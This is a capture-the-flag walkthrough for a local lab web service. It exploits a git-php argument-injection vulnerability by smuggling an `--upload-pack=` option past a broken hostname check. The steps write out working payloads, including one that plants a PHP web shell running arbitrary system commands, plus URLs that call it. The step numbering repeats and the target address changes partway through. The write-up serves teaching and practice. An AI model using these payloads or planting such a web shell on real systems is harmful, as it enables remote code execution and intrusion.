1. Notice that the web service utilises HTTPS, navigate to https://127.0.0.1:5007/
2. In the HTML source there is a reference to a phpinfo display, navigate to https://127.0.0.1:5007/phpinfo.php
3. At the bottom of the phpinfo display there is a comment mentioning git-php is in use
4. Searching for vulnerabilities in git-php will return the following result https://security.snyk.io/vuln/SNYK-PHP-CZPROJECTGITPHP-2421349
5. Notice that any URL we enter returns a 'Could not process the input. Please provide a URL to the repository'. This is a filter looking for the right server name. The 'GitBox' server is hinted on the page, and the HTTPS certificate discloses the domain bigmoneyprojects.internal. Attempting the url https://GitBox.bigmoneyprojects.internal/asd returns a different response showing that the URL was attempted - 'The GitLab url is not readable!'
6. We also have to notice that the comparison is broken and does not start from the beginning of the input, i.e. `asdasddasd GitBox.bigmoneyprojects.internal` also works
6. Attempt the following blind payload for the CVE - `--upload-pack=echo hi > hi.txt; GitBox.bigmoneyprojects.internal`
7. The insecure comparison is important since the payload must start with `--upload-pack=blah blah blah`. This can be identified by donwloading the plugin and testing this out locally
6. Attempt the following blind webshell payload for the CVE - `--upload-pack=echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' > test.php; GitBox.bigmoneyprojects.internal`
7. The web shell can then be queried via `https://192.168.1.2:5007/test.php?cmd=id`
8. flag can be retried via following payload `https://192.168.1.2:5007/test.php?cmd=cat%20flag.txt`